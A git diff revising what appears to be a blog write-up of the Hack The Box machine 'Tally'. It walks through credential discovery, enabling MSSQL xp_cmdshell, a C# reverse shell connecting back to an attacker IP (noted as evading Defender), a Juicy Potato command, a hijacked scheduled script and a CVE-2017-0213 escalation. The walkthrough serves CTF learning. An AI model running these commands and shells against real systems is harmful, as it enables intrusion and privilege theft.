@@ -8,18 +8,21 @@ published: false
 
 ## Summary
 - Tally is great box with multiple exploit paths for both initial access and privilege escalation.
-- We find a SharePoint site on port 80 which we enumerate to find a web page with a couple of interesting pieces of information.
-- One: being credentials for the listening FTP service. And, Two: being intel about an HTML document to be uploaded to the FTP share for review by another user.
-- After successfully logging into FTP, we find an installer for a specific version of Firefox which was vulnerable to an RCE vulnerability and exploitable with a malicious HTML.
-- Having confirmed that the victim was using that version, we plant a payload but fail to get code execution due to the inconsistency of the exploit. So we move along.
-- Going through the rest of the FTP share, we find a KeePass database file which we crack to gain access to an SMB share.
-- On that share, we find a custom binary that contained credentials for the MSSQL instance on the box as the `sa` user.
-- After we authenticated, we enabled the `xp_cmdshell` feature and were able to execute a reverse shell and get on the system.
-- Having gained access through MSSQL, we had the `SeImpersonatePrivilege` which we easily exploited using Juicy Potato to escalate our privileges to `NT AUTHORITY\System`.
-- There was another unintended path for privesc using a modifiable PowerShell script that was running as the `Administrator` user as part of a scheduled task.
-- We added a PowerShell reverse shell to that script and owned the box a second way.
-- A third path -which was the intended one- was to use CVE-2017-0213. We found the C++ code for it on GitHub but couldn't compile it due to an error.
-- We googled the error and were able to build the exploit binary. However, it only worked when we used the x86 version in an interactive process. We managed to provide the latter through a Metasploit meterpreter shell.
+- Intially, we found a SharePoint site on port 80 which we enumerated to find a web page with a couple of interesting bits of information.
+- One: credentials for the listening FTP service.
+- Two: being intel about an HTML document to be uploaded to the FTP share for review by another user.
+- After successfully logging into FTP, we find an installer for a specific version of Firefox which was vulnerable to an RCE vulnerability.
+- Having confirmed that the victim was using that version, we planted a malicious HTML payload but failed to get code execution due to the inconsistency of the exploit.
+- Moving along, we go through the FTP share to find a KeePass database file which we crack open and gain creds for an SMB share.
+- On that share, we find a custom binary that contained credentials for the `sa` user on the running MSSQL instance.
+- After logging in using the `sqsh` command-line utility, we enabled the `xp_cmdshell` feature and were able to execute a reverse shell and get on the system as the `sarah` user.
+- Having gained access through MSSQL, we had the `SeImpersonatePrivilege` enabled which we easily exploited using Juicy Potato to escalate our privileges to `NT AUTHORITY\System`.
+- There was another unintended path for privesc using a modifiable PowerShell script on `sarah`'s desktop that was running as a scheduled task under the `Administrator` user.
+- We added our payload to that script and owned the box a second way.
+- A third path -which was the intended one- was to use CVE-2017-0213. We found the C++ PoC for it on GitHub but couldn't compile it at first due to an error.
+- We googled it and were able to build the exploit binary. However, it only worked when we used the x86 version in an interactive process.
+- We used Metasploit's multi-handler module to catch a standard shell and upgrade it to a Meterpreter.
+- And later migrated to a stable interactive process where we ran the binary to escalate our privleges to `NT Authority\System` for the 3rd time.
 
 ---
 
@@ -128,32 +131,26 @@ Host script results:
 5. Another HTTP port there on 15567
 
 ## Quick FTP Check
-Before checking SharePoint, we pass by FTP to see if it's offering any freebies :D
+Before checking SharePoint, we pass by FTP to see if it's offering any freebies
 
 ![](/assets/Tally/no-ftp-anon.jpg)
 
-Nope!
+anonymous login wasn't allowed.
 
 ## Enumerating Sharepoint
 Checking the website, we get redirected to `/_layouts/15/start.aspx#/default.aspx`
 
 ![](/assets/Tally/sharepoint-home-page.jpg)
 
-To enumerate SharePoint, we will do a `gobuster` using a wordlist from `seclists`.
+To enumerate SharePoint, we needed a wordlist for its web directories.
 
-when doing a quick `find`, we get two lists. But they happen to be almost identical.
+This [one](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/CMS/sharepoint.txt) from the Seclists repo was good.
 
-![](/assets/Tally/comparing-sharpoint-wordlists.jpg)
-
-the `sharepoint.txt` had more endpoints. for max coverage, I removed the first `/` from `Sharepoint.fuzz.txt` and added both to one inclusive list.
-
-![](/assets/Tally/adding-up-sharepoint-lists.jpg)
-
-and launched `gobuster` at it.
+We launched `gobuster` specifying the `--timeout` flag to 60 seconds since SharePoint was very slow :/
 
 ![](/assets/Tally/gobuster.jpg)
 
-we get a load of pages to check. One was special though: `/_layouts/15/viewlsts.aspx`
+Out of the many pages, one was special: `/_layouts/15/viewlsts.aspx`
 
 ![](/assets/Tally/sharepoint-file-list.jpg)
 
@@ -165,97 +162,64 @@ When we opened the file we found ourselves a password :)
 
 ![](/assets/Tally/ftp-details-document.jpg)
 
-Before trying anything, we went back to verify the "Site Pages" list
+the "Site Pages" list also had something
 
 ![](/assets/Tally/site-pages-list.jpg)
 
-We have a lot of information here
+a lot of information here
 
 ![](/assets/Tally/migration-update-note.jpg)
 
-- we got 4 usernames: Rahul, ftp_user, Sarah & Tim
-- we know Rahul is expected to put an `index.html` file in the "Intranet" folder which we're sure either Sarah or Tim will open. This is could very well be a client-side attack vector.
+- we got 4 usernames: `rahul`, `ftp_user`, `sarah` & `tim`
+- we now know `rahul` is expected to put an `index.html` file in the "Intranet" folder which either `sarah` or `tim` will open.
 
-but let's first spray those credentials over both SMB and FTP
+This is could very well be a client-side attack vector.
+
+but let's first test those credentials against both SMB and FTP
 
 ![](/assets/Tally/smb-worked-for-ftp-user.jpg)
 
-SMB worked, but there was no permissions over any shares.
+SMB worked, but there were no permissions over any shares.
 
-We did a RID enumeration to find the local users after the `--users` flag failed.
+![](/assets/Tally/no-shares-available.jpg)
+
+Enumerating local users with the `--users` flag failed.
 
 ![](/assets/Tally/user-enumeration.jpg)
 
-But it looks like that's as far we're going to go with SMB. let's get back to FTP because we're positive we have access there.
+But RID brute-forcing worked and got us every user on the box. They might come in handy.
+
+![](/assets/Tally/user-enumeration-rid-brute.jpg)
+
+But that was it for SMB.
+
+We then tested all our creds with FTP and found the `ftp_user` valid as expected.
 
 ![](/assets/Tally/ftp-access-confirmed-hydra.jpg)
 
-## Back to FTP
+## FTP Share Enumeration
 
 ![](/assets/Tally/ftp-directories.jpg)
 
-After browsing the FTP and finding a lot of files and folders there, we decide we should download it to our kali to be able to use utilities like `find` and for speed.
+After browsing the share and finding a lot of files/folders there, we decided to download it for speed and to leverage tools like `find` for search and what not.
 
-we can do so with `wget`'s `-m` flag (for mirror).
+we can do so with `wget`'s `-m` flag (for mirroring).
 
 ```bash
 wget -m ftp://ftp_user:'UTDRSCH53c"$6hys'@tally
 ```
 
-when we go into the "Intranet" folder (mentioned in the note we found earlier), we find a sub-folder called binaries.
-
-It contained a certain version of the Firefox browser which was vulnerable.
-
-![](/assets/Tally/3-exploits-for-vuln-firefox.jpg)
-
-## Checking Out Firefox Exploits
-
-Our theory is: if we found this installer, that means that there's a high chance it's being used in the environment.
-
-And since either Sarah or Tim will be checking an `index.html` from Rahul, they will probably use that version of Firefox to do so.
-
-And that's where the exploit should come in.
-
-To confirm our theory and before spending any time on this path, we will upload an `index.html` to the "Intranet" folder
-
-and set its contents to redirect to our kali.
-
-![](/assets/Tally/index-html-redirect.jpg)
-
-After a couple of minutes, we get our confirmation :)
-
-![](/assets/Tally/victim-firefox-version-confirmed.jpg)
-
-We first check the Metasploit module but it turned out it wasn't a match for the version we found.
-
-![](/assets/Tally/MSF-firefox-exploit-no-match.jpg)
-
-We then turn to the one which had an exact version match match.
-
-![](/assets/Tally/edb-firefox-exploit-verified.jpg)
-
-it was verified and everything. And it did work well when we tested it.
-
-![](/assets/Tally/calc-works-ff-exploit.jpg)
-
-but that was it. Only `Calc.exe` worked. no matter how many shellcodes we generated using `sc2asmjs.py`. they all failed.
-
-![](/assets/Tally/ff-exploit-instructions.jpg)
-
-Hours passed here without results. So we had to move on :/
-
-## Finding Creds Elsewhere
-Continuing to search in FTP, we find a KeePass file in `tim`'s files.
+while browsing the contents, we found a KeePass file in `tim`'s folder.
 
 ![](/assets/Tally/keepass-file-found.jpg)
 
-we convert it to a hash using `keepass2john` and crack it.
+we converted it to a hash using `keepass2john` and cracked it.
 
 ![](/assets/Tally/keepass-pass-cracked.jpg)
 
-and carry the .kdbx file over to our windows VM along with the KeePass exe files that were on the share to run the application.
+we carried the .kdbx file over to our windows VM along with the KeePass program files that were on the share then ran the application.
 
-we find a password for a share called ACCT (we found that earlier when checking the SMB shares with the `ftp_user` account)
+Inside, we found a password for a share called ACCT (we saw that earlier when enumerating SMB)
 
 ![](/assets/Tally/keepass-passwords.jpg)
 
@@ -263,150 +227,238 @@ and another password that looks for a cisco product.
 
 ![](/assets/Tally/cisco-password.jpg)
 
-Automatically, we shuffle all the users we have with all the passwords and do a spray :D
+Automatically, we shuffle the usernames/passwords and spray
 
 ![](/assets/Tally/spray-and-finance-share-access.jpg)
 
-As expected, we get access to the ACCT share with the `Finance` user. and we ruled out any password reuse.
+The creds for the `finance` user worked and we got access to the ACCT share.
 
-## Going through the ACCT share
-We mounted the share successfully and started browsing it.
+![](/assets/Tally/finance-share-access.jpg)
+
+
+## Going through SMB
+We mounted the share and started browsing.
+
+```bash
+mount -t cifs -o 'username=Finance,password=Acc0unting' //tally/ACCT finance-smb/
+```
 
 ![](/assets/Tally/mounting-the-smb-share.jpg)
 
-we find a set of creds in the "/zz_Arhived/SQL" folder but they were indeed old.
-
-![](/assets/Tally/old-db-creds.jpg)
-
-Later on, we find a custom binary called "tester.exe" in "/zz_Migration/Binaries/New folder"
+A custom binary called `tester.exe` was in `/zz_Migration/Binaries/New folder`
 
 ![](/assets/Tally/tester-exe-found.jpg)
 
-when running `strings` against it, we find creds inside:
+when running `strings` against it, we found creds inside:
 
 ![](/assets/Tally/db-password-found.jpg)
 
-## Getting a shell through MSSQL DB
+## Getting a shell through MSSQL
 The creds worked when we connected to MSSQL on port 1433.
 
 However, to execute commands, we needed to enable the `xp_cmdshell` feature which was initially blocked.
 
-At first, it wouldn't be enabled as it was set as an "advanced option".
+At first, it wouldn't get enabled for being set as an "advanced option".
 
-When we enabled the "show advanced options" option, we were able re-enable the `xp_cmdshell` option and get code execution as the `sarah` user.
+so we reconfigured the shell to "show advanced options" and could then re-enable `xp_cmdshell` using the commands below:
+
+```sql
+exec sp_configure 'show advanced options', '1'
+reconfigure
+exec sp_configure 'xp_cmdshell', '1'
+reconfigure
+xp_cmdshell 'whoami'
+```
+
+After running the `whoami` command, we find ourselves executing code as the `sarah` user.
 
 ![](/assets/Tally/enabling-xp-cmd-shell-mssql.jpg)
 
-because the `xp_cmdshell` option kept getting automatically disabled, we set the MSSQL commands in a file.
+Because, over time, the `xp_cmdshell` option kept getting automatically disabled, we set the MSSQL commands in a file for a bit of automation.
 
-We added the code to re-enable it then do a PowerShell web request for a [Nishang Reverse Shell](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) which we hosted on our server.
+We added the code to re-enable it and do a PowerShell web request to execute a [Nishang Reverse Shell](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) hosted on our server.
 
 ![](/assets/Tally/shell-as-sarah.jpg)
 
-We got our shell :]
+We were now inside as `sarah`
 
 ## Privesc Path #1: Abusing the SeImpersonatePrivilege
 
-Since we got in through MSSQL, we're sure we have the `SeImpersonatePrivilege` which is ripe for exploitation using `JuicyPotato` :D
+Since we got in through MSSQL, we had the `SeImpersonatePrivilege` enabled.
 
-we download the binary [here](https://github.com/ohpe/juicy-potato/releases/tag/v0.1) and call it `jp.exe`
+![](/assets/Tally/se-impersonate-enabled.jpg)
 
-and from experience, it's best to give this tool a single executable to run rather than pass it arguments.
+That's ripe for exploitation using the well-known Juicy Potato exploit.
 
-so our choice for this is a standard C# revere shell. you can find its source [here](https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc)
+we download the binary from [Github](https://github.com/ohpe/juicy-potato/releases/tag/v0.1) and call it `jp.exe`
 
-note: it's also good for bypassing Anti-virus.
+That exploit always gave me the best results when used with a single executable rather than passing arguments.
 
-we modify the code adding our ip and port
-```C#
-public static void Main(string[] args)
-		{
-			using(TcpClient client = new TcpClient("10.10.16.4", 9001))
-			{
-				using(Stream stream = client.GetStream())
+Our choice is going to be a [C# reverse shell](https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc)
+
+because that shell is also good for bypassing Windows Defender which was enabled and hinted for in the `todo.txt` file on `sarah`'s desktop:
+
+![](/assets/Tally/windows-defender-hint.jpg)
+
+we can confirm that with:
+
+```powershell
+Get-MpComputerStatus
 ```
 
-and compile it using the .NET framework compiler (you can ingore the compilation errors)
+![](/assets/Tally/real-time-protection-enabled.jpg)
+
+After getting the shell, we modify it with our IP and port
+```C#
+// SNIP //
+TcpClient client = new TcpClient("10.10.16.4", 9001)
+// SNIP //
+```
+
+We then compile on the victim machine using the native .NET framework compiler
 ```
 c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:rev.exe C:\Users\sarah\rev.cs
 ```
 
+Note: the compilation errors weren't serious here
+
 ![](/assets/Tally/compilin-csharp-rev.jpg)
 
-after running Juicy Potato with the shell to execute, it gives us back a reverse shell as `nt authority\system`
+after running Juicy Potato with the shell to execute, it gave us back a reverse shell as `nt authority\system`
+
+```
+jp.exe -l 1337 -p c:\users\sarah\rev.exe -t *
+```
 
 ![](/assets/Tally/juicy-potato-to-system-rev-shell.jpg)
 
 
 ## Privesc Path #2: Modifying the Scheduled PowerShell Script
-On Sarah's desktop, we found a Powershell script called `SPBestWarmup.ps1` and another xml file with the same name `SPBestWarmup.xml`
+Also on `sarah`'s desktop, there was a Powershell script called `SPBestWarmup.ps1` and another XML file with the same name `SPBestWarmup.xml`
 
 ![](/assets/Tally/spwarmup-scripts.jpg)
 
-when looking within the XML file, we notice something:
+when looking within at the XML file, we notice something:
 
 ![](/assets/Tally/spwarmup-xml-contents.jpg)
 
-these are the options we find in task scheduler when creating any task.
+these options indicate that this script is part of a scheduled task.
 
-We run a quick command `Get-ACL` to find if we can write to this script
+To check if we can exploit this, We run a `Get-ACL` to find our permissions.
+
+```powershell
+Get-ACL .\SPBestWarmup.ps1 | Select -Expand AccessToString
+```
 
 ![](/assets/Tally/write-access-to-script.jpg)
 
-we're good! :D
+We have full control!
 
-We added a reverse shell to that script right away.
+We went ahead and added a reverse shell to that script right away.
 
-However, that script was configured to run every hour. so we had to wait for it :S
+However, it was configured to run every hour. so we had to wait for it :S
 
 But eventually, we received a shell as `Administrator`
 
 ![](/assets/Tally/shell-as-administrator.jpg)
 
 ## Privesc Path #3: CVE-2017-0213
-After taking over the machine using the above two ways, I found that this was the intended path :D
+After taking over the machine using the above two ways, and looking at the [Official Writeup](https://app.hackthebox.com/machines/Tally/walkthroughs), I found that this was the intended path.
 
-To exploit this vulnerability, we first got ourselves a meterpreter shell using first our C# reverse shell then Metasploit's `shell_to_meterpreter` module.
+The [source code](https://github.com/SecWiki/windows-kernel-exploits/blob/master/CVE-2017-0213/CVE-2017-0213.cpp) needed to be compiled in Visual Studio to get the binary.
 
-the command `sessions -u 1` means "upgrade session 1"
-
-![](/assets/Tally/upgrade-to-meterpreter.jpg)
-
-we're going to compile the source code [here](https://github.com/SecWiki/windows-kernel-exploits/blob/master/CVE-2017-0213/CVE-2017-0213.cpp) in Visual Studio.
-
-But we were getting an error:
+without any modifications, we get a type error:
 
 ![](/assets/Tally/eop-cve-compile-error.jpg)
 
-when Googling this error (including the variable name), we find a stack overflow question which was answered.
+On Google, we query with the error as well as the variable name to get accurate results
 
 ![](/assets/Tally/google-stackoverflow.jpg)
 
+By coincidence, the first result happened to be for the exact exploit. Here was the solution:
+
 ![](/assets/Tally/exploit-error-fix.jpg)
 
-when:
-1. applying the fix
-2. editing the `cmdline` variable for our shell path (normal exploit behavior is to run a `cmd.exe` which is just for demonstration)
-3. selecting the process architecutre as `x86`
+After applying the fix, we edited the `cmdline` variable and inserted our shell's path instead.
 
-we can successfully compile the exploit
+That's because the normal exploit behavior was to run a `cmd.exe` which is just a Proof of Concept
+
+We make sure to select the `x86` process architecture as the 64-bit version doesn't work :/
 
 ![](/assets/Tally/cpp-build-succeeded.jpg)
 
-and upload it to `sarah`'s home folder
+Running the exploit at this point didn't work.
 
-![](/assets/Tally/uploading-privesc-cve.jpg)
+That's because it had to be run as an "interactive process".
 
-but it wouldn't work unless we migrate to an interactive process.
+To proceed, we must get a Meterpreter shell.
 
-we do that through metepreter using `ps` then looking for a process with a Session ID equal to 1
+We can get that by first starting a Metasploit handler on our Kali box.
 
-![](/assets/Tally/finding-interactive-session.jpg)
+On Tally, we use PowerShell's `start-process` command with the `rev.exe` binary to fork from our shell and connect back to our listener.
 
-we migrate succesfully but to `svchost.exe` because it's more stable than the one highlighted above.
+Once we catch the shell, we can upgrade it using the `sessions -u` command:
+
+![](/assets/Tally/upgrade-to-meterpreter.jpg)
+
+Now that we have a Meterpreter shell, becoming an "interactive process" can be easily achieved by migrating to a process with session ID = 1
+
+we choose `svchost.exe` because it ought to be a stable process.
 
 ![](/assets/Tally/migration-done.jpg)
 
-we then drop into a cmd shell with the `shell` command and launch the exploit to get a connection back as `nt authority\system`
+After migrating, we drop into a cmd shell with the `shell` command and launch the exploit. And get a connection back as `nt authority\system`
 
 ![](/assets/Tally/cve-eop-worked.jpg)
+
+Very difficult. But pretty sweet :D
+
+## Rabbit Hole: Chasing the Firefox Exploit
+
+when we go into the `Intranet` folder (mentioned in the note on SharePoint), we find a sub-folder called `binaries`.
+
+It contained a certain version of Firefox.
+
+![](/assets/Tally/3-exploits-for-vuln-firefox.jpg)
+
+When using `searchsploit`, we find a couple of exploits for it.
+
+![](/assets/Tally/firefox-searchsploit.jpg)
+
+Our theory has a few parts:
+
+- if we found this installer, that means that there's a high chance it's being used in the environment.
+- And since either `sarah` or `tim` will be checking an `index.html` from `rahul`, they will probably use that version of Firefox to do so.
+- And that's where the exploit should come in.
+
+To confirm our theory and before spending any time on this path, we will upload an `index.html` to the `intranet` folder setting it up to redirect to our kali.
+
+![](/assets/Tally/index-html-redirect.jpg)
+
+We have to use the binary mode to avoid any corruption.
+
+![](/assets/Tally/ftp-binary-upload.jpg)
+
+After a couple of minutes, we get our confirmation through the `user-agent` HTTP header.
+
+![](/assets/Tally/victim-firefox-version-confirmed.jpg)
+
+Knowing that Metasploit modules are usually well-developed, we checked it first. Sadly, it wasn't matching our target.
+
+![](/assets/Tally/MSF-firefox-exploit-no-match.jpg)
+
+We then turned to the one with the exact version match.
+
+![](/assets/Tally/edb-firefox-exploit-verified.jpg)
+
+it was verified on EDB. and it did work well in testing. But only with `calc.exe` :/
+
+![](/assets/Tally/calc-works-ff-exploit.jpg)
+
+no matter how many shellcodes we generated using `sc2asmjs.py`. None worked.
+
+![](/assets/Tally/ff-exploit-instructions.jpg)
+
+the 3rd version on `searchsploit` did work. But after many many tries.
+
+you can find that in the [Official Writeup](https://app.hackthebox.com/machines/Tally/walkthroughs)
